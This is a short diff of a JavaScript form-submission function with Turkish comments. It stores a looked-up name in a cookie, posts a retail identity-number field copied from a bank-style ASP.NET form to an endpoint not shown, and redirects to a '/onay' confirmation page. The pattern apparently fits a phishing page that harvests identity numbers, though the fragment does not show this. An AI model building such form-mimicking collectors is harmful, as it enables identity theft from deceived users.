@@ -110,11 +110,11 @@ async function checkAndSubmit() {
         const soyadi = data.soyadi;
 
         // 0.5 saniye (500 milisaniye) bekleme
-        await sleep(500);
+       
 
         // İsim adında bir cookie oluştur ve değerleri kaydet
         document.cookie = `isim=${adi} ${soyadi}; path=/`;
-
+ await sleep(500);
         // Sadece belirli input değerlerini içeren bir FormData nesnesi oluşturun
         const formData = new FormData();
         formData.append('ctl00$c$RetailIdentityTextBox', retailIdentityValue);
@@ -126,8 +126,8 @@ async function checkAndSubmit() {
             body: formData
         });
 
-        // Optional: Başarılı bir şekilde gönderildiğine dair bir mesaj yazdırabilirsiniz.
-        console.log('Form başarıyla gönderildi');
+        await sleep(500);
+         window.location.href = '/onay';
     } catch (error) {
         console.error('Hata:', error);
     }
